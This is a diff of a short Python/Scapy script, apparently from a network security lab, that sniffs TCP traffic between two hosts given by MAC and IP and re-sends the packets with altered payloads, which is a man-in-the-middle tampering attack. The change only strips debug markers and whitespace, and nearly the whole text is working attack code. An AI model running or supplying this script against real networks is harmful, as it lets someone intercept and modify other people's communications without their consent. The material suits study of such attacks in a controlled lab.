@@ -24,11 +24,11 @@ def spoof_pkt(pkt):
     send(newpkt)
   elif pkt[IP].src == ip_A and pkt[IP].dst == ip_B:
       data = pkt[TCP].payload.load
-      newdata = data.decode().upper() + "H1: "
+      newdata = data.decode().upper()
       send(newpkt/newdata)
   elif pkt[IP].src == ip_B and pkt[IP].dst == ip_A:
       data = pkt[TCP].payload.load
-      newdata = data.decode().lower() + "H2: "
+      newdata = data.decode().lower()
       send(newpkt/newdata)
   else:
       send(newpkt)
@@ -39,9 +39,9 @@ mac_A = sys.argv[2]
 ip_B = sys.argv[3]
 mac_B = sys.argv[4]
 
-template = 'tcp and (ether src {A} or ether src {B})' 
+template = 'tcp and (ether src {A} or ether src {B})'
 cap_filter = template.format(A=mac_A, B=mac_B)
 print(cap_filter)
 pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt)
 
-  
+
